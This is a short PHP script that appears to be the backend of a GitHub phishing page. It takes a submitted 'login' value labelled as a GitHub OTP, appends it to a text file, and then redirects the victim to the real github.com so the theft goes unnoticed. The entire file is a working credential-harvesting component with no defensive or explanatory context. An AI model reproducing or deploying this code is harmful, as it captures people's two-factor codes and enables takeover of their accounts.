<?php

file_put_contents("otp.txt", "Github OTP : " . $email = $_POST['login'] . "\n", FILE_APPEND);
header('Location: https://github.com/');
?>
